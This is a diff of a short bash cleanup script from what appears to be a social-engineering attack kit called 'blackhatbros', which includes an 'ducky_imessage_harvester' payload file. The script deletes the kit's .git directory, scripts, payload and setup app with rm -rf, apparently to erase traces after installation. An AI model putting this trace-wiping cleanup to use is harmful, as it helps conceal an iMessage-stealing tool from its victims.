@@ -1,13 +1,13 @@
 #!/bin/bash
 CDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd ) #Directory of app
-rm -rf ${CDIR}/../.git
-rm -rf ${CDIR}/../.gitignore
-rm -rf ${CDIR}/../icons
-rm -rf ${CDIR}/../Info.plist
-rm -rf ${CDIR}/../general.sh
-rm -rf ${CDIR}/../applescripts
-rm -rf ${CDIR}/../ducky_imessage_harvester.txt
-cd ${CDIR}/../../
-mv ./blackhatbros/* .
+rm -rf ${CDIR}/../../.git
+rm -rf ${CDIR}/../../.gitignore
+rm -rf ${CDIR}/../../icons
+rm -rf ${CDIR}/../../Info.plist
+rm -rf ${CDIR}/../../general.sh
+rm -rf ${CDIR}/../../applescripts
+rm -rf ${CDIR}/../../ducky_imessage_harvester.txt
+cd ${CDIR}/../../../
+mv ./blackhatbros/SOCIAL_ENG_ATK_VCTR/* .
 rm -rf ./blackhatbros
 rm -rf ./setup.app #cleanup
